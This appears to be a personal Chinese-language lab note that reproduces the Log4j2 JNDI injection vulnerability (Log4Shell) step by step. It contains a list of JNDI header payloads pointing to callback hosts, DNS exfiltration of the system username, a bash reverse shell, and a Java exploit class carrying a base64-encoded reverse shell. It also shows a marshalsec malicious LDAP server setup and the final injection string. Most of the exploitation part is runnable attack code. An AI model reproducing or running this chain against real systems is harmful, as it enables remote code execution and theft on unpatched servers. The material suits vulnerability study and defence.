# 排查
1.查看是否存在使用依赖
2.查找`log4j2.xml`、`log4j2.properties`或`log4j2.yaml`文件，确认 Log4j 的使用
3.关注
```
打印：
	使用占位符记录外部数据 logger.info("用户操作: {}", externalData);
	字符串拼接（部分情况仍可能触发） logger.info("用户操作: " + externalData); 
	记录硬编码或内部可控数据 logger.info("系统启动完成");
导包：
	import org.apache.logging.log4j.Logger;
	import org.apache.logging.log4j.LogManager;
	Logger logger = LogManager.getLogger(MyClass.class)

```
playload
```
X-Client-IP: ${jndi:ldap://1644763261510dpicz.zdl7qs.ceye.io/VXBQo}
X-Remote-IP: ${jndi:ldap://1644763261510jnabe.zdl7qs.ceye.io/vl}
X-Remote-Addr: ${jndi:ldap://1644763261510xplnj.zdl7qs.ceye.io/hTE}
X-Forwarded-For: ${jndi:ldap://1644763261510lbnhl.zdl7qs.ceye.io/hvgsw}
X-Originating-IP: ${jndi:ldap://1644763261510pbhdy.zdl7qs.ceye.io/LxrC}
True-Client-IP: ${jndi:rmi://1644763261510jjchm.zdl7qs.ceye.io/FrfXm}
Originating-IP: ${jndi:rmi://1644763261510jctho.zdl7qs.ceye.io/vbP}
X-Real-IP: ${jndi:rmi://1644763261510fyvxt.zdl7qs.ceye.io/fWmjt}
Client-IP: ${jndi:rmi://1644763261510nfaoa.zdl7qs.ceye.io/mS}
X-Api-Version: ${jndi:rmi://1644763261510daeem.zdl7qs.ceye.io/IdJ}
Sec-Ch-Ua: ${jndi:dns://1644763261510wjiit.zdl7qs.ceye.io/IX}
Sec-Ch-Ua-Platform: ${jndi:dns://1644763261510dacbb.zdl7qs.ceye.io/ftA}
Sec-Fetch-Site: ${jndi:dns://1644763261510rypwe.zdl7qs.ceye.io/asWuD}
Sec-Fetch-Mode: ${jndi:dns://1644763261510osrig.zdl7qs.ceye.io/zc}
Sec-Fetch-User: ${jndi:dns://1644763261510uvfsl.zdl7qs.ceye.io/oNpOs}
Sec-Fetch-Dest: ${jndi:dns://1644763261510ptqen.zdl7qs.ceye.io/fGwFl}
```
[log4j漏洞复现及详细分析 - FreeBuf网络安全行业门户](https://www.freebuf.com/news/368061.html)


# 审计代码查看存在使用log4j的依赖
![[Pasted image 20250605142252.png]]
查看配置文件，以及采用log4j进行记录日志的地方
![[Pasted image 20250605143642.png]]
![[Pasted image 20250605143656.png]]
有很多，这里采用图片上传这里来进行操作
![[Pasted image 20250605143732.png]]
![[Pasted image 20250605143751.png]]
尝试dns外带，由于是windows环境所以需要windows的命令
${env:USERNAME}
```
${jndi:dns://${sys:user.name}.d42f3r.dnslog.cn}
```
![[Pasted image 20250606222917.png]]

可以判断是存在该漏洞的，接下来就是利用
在kali上我去开一个jndi服务，在服务端编写一个exp的类用于实现打开计算机服务
当我本地环境开启后，进行抓包并构造playload让其访问jndi的服务器kali，他就会自动去执行该jndi下绑定的服务
【其实就跟jndi的ldap或rmi一样。攻击者伪造的服务端上写一个恶意类并绑定服务。存在漏洞的站点执行jndi的playload相当于jndiclient，直接访问了jndiserver，就导致执行了恶意类】

具体实现像按照自己本地编写的rmi服务来实现
可参考
[Fastjson反序列化漏洞原理与漏洞复现（基于vulhub，保姆级的详细教程）_fastjson漏洞原理-CSDN博客](https://blog.csdn.net/Bossfrank/article/details/130100893)
[log4j2远程代码执行漏洞原理与漏洞复现（基于vulhub，保姆级的详细教程）_log4j漏洞复现-CSDN博客](https://blog.csdn.net/Bossfrank/article/details/130148819)

# fantanshell-jndiInjection



# 复现反弹shell---自定义
使用rmi或者ldap服务部署在攻击者机器上
rmi可以自己编写
ldap采用marshalsec进行部署，下载该文件，使用maven在该文件下执行
mvn clean package -DskipTests
编译成功之后，在target下使用编译好的jar包开启一个恶意的ldap服务

1.编写exp,反弹到攻击者机器192.168.31.149的777端口
```
bash -i >& /dev/tcp/192.168.31.149/7777 0>&1
```
![[Pasted image 20250605181713.png]]
也可进行编码，构造好的java文件
```java
import java.lang.Runtime;  
import java.lang.Process;  
public class Exp {  
    public Exp(){  
        try{  
            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjE0OS83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}");  
        }catch(Exception e){  
            e.printStackTrace();  
        }  
    }  
    public static void main(String[] argv){  
        Exp e = new Exp();  
    }  
}
```

2.将构造好的exp.java文件进行编译class，放到指定目录，该目录下开启python开启临时服务器
python -m http.server 4444
![[Pasted image 20250605182126.png]]

3.使用脚本搭建ldap服务，在maven执行完成之后，在target下生层的文件，执行
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer  "http://192.168.200.131:4444/#Exploit" 1389
```
1389为自定义ldap端口号，http为我们生成的临时服务器地址
![[Pasted image 20250605182412.png]]
4.另起终端监听777端口用于监听反弹shell
![[Pasted image 20250605182429.png]]
5.在注入点进行插入playload
${jndi:ldap://192.168.200.131:1389/Exploit}


prooduct接口，dns探测
![[Pasted image 20250607042512.png]]
执行calc

反弹shell
